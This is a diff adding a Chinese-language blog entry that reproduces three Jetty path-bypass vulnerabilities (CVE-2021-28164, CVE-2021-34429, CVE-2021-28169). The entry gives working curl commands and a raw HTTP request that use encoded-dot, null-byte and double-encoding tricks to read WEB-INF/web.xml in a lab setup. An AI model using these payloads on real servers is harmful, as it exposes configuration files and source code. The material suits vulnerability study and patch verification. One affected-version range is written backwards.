@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>Jetty-敏感信息泄露</title>
+      <link href="/2021/10/15/jetty-min-gan-xin-xi-xie-lu/"/>
+      <url>/2021/10/15/jetty-min-gan-xin-xi-xie-lu/</url>
+      
+        <content type="html"><![CDATA[<h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不为此承担任何责任。</p><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>该漏洞导致攻击者可以下载<code>WEB-INF</code>目录下的任意文件。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="1、CVE-2021-28164"><a href="#1、CVE-2021-28164" class="headerlink" title="1、CVE-2021-28164"></a>1、CVE-2021-28164</h3><ul><li><h4 id="漏洞描述-1"><a href="#漏洞描述-1" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><p>Eclipse Jetty是一个开源的servlet容器，它为基于Java的Web容器提供运行环境。</p><p>Jetty 9.4.37引入对RFC3986的新实现，而URL编码的<code>.</code>字符被排除在URI规范之外，这个行为在RFC中是正确的，但在servlet的实现中导致攻击者可以通过<code>%2e</code>来绕过限制，下载WEB-INF目录下的任意文件，导致敏感信息泄露。该漏洞在9.4.39中修复。</p></li><li><h4 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h4><p>9.4.37~9.4.28</p></li><li><h4 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> http://target-ip:port/%2e/WEB-INF/web.xml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/1uckyun/CDN/images/image-20211015093946053.png" alt="curl"></p><br><pre class="line-numbers language-Get数据包" data-language="Get数据包"><code class="language-Get数据包">GET /%2e/WEB-INF/web.xml HTTP/1.1Host: 192.168.88.105:18080Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: close<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/1uckyun/CDN/images/image-20211015094116737.png" alt="burp"></p></li></ul><h3 id="2、CVE-2021-34429"><a href="#2、CVE-2021-34429" class="headerlink" title="2、CVE-2021-34429"></a>2、CVE-2021-34429</h3><ul><li><h4 id="漏洞描述-2"><a href="#漏洞描述-2" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><p>Jetty在9.4.40后修复了因为<code>%2e</code>导致的敏感信息泄露漏洞CVE-2021-28164，但这个修复是不完全的，通过下面三种方式可以进行绕过</p><p>​    unicode形式URL编码：<code>/%u002e/WEB-INF/web.xml</code><br>​    <code>\0</code>组合<code>.</code>导致的绕过：<code>/.%00/WEB-INF/web.xml</code><br>​    <code>\0</code>组合<code>..</code>导致的绕过：<code>/a/b/..%00/WEB-INF/web.xml</code></p></li><li><h4 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h4><p><code>9.4.37</code> ~ <code>9.4.42</code></p><p><code>10.0.1</code> ~ <code>10.0.5</code></p><p><code>11.0.1</code> ~ <code>11.0.5</code></p></li><li><h4 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> http://127.0.0.1:18080/%u002e/WEB-INF/web.xml<span class="token function">curl</span> http://127.0.0.1:18080/.%00/WEB-INF/web.xml<span class="token function">curl</span> http://127.0.0.1:18080/a/b/<span class="token punctuation">..</span>%00/WEB-INF/web.xml<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/1uckyun/CDN/images/image-20211015094909174.png" alt="unicode绕过"></p><p><img src="https://cdn.jsdelivr.net/gh/1uckyun/CDN/images/image-20211015095009000.png" alt=" \0 组合 . 绕过"></p><p><img src="https://cdn.jsdelivr.net/gh/1uckyun/CDN/images/image-20211015095030962.png" alt=" \0 组合 .. 绕过"></p></li></ul><h3 id="3、CVE-2021-28169"><a href="#3、CVE-2021-28169" class="headerlink" title="3、CVE-2021-28169"></a>3、CVE-2021-28169</h3><ul><li><h4 id="漏洞描述-3"><a href="#漏洞描述-3" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><p>在9.4.40, 10.0.2, 11.0.2版本前，Jetty Servlets中的<code>ConcatServlet</code>、<code>WelcomeFilter</code>类存在多重解码问题，如果开发者主动使用了这两个类，攻击者可以利用其访问WEB-INF目录下的敏感文件，造成配置文件及代码泄露。</p></li><li><h4 id="影响版本-2"><a href="#影响版本-2" class="headerlink" title="影响版本"></a>影响版本</h4><p>Jetty &lt;= 9.4.40</p><p>Jetty &lt;= 10.0.2</p><p>Jetty &lt;= 11.0.2</p></li><li><h4 id="漏洞复现-3"><a href="#漏洞复现-3" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>查看网页源码：若出现了<code>/static?/</code>的字样，说明使用了存在漏洞的<code>ConcatServlet</code>类。</p><p><img src="https://cdn.jsdelivr.net/gh/1uckyun/CDN/images/image-20211015095616550.png" alt="网页源码"></p><p><br>POC:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> -v <span class="token string">'http://127.0.0.1:18080/static?/%2557EB-INF/web.xml'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/1uckyun/CDN/images/image-20211015100105126.png" alt="读取web.xml"></p></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> 漏洞复现 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Jetty 敏感信息泄露 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Apache Solr 任意文件读取</title>
       <link href="/2021/10/14/apache-solr-ren-yi-wen-jian-du-qu/"/>
       <url>/2021/10/14/apache-solr-ren-yi-wen-jian-du-qu/</url>
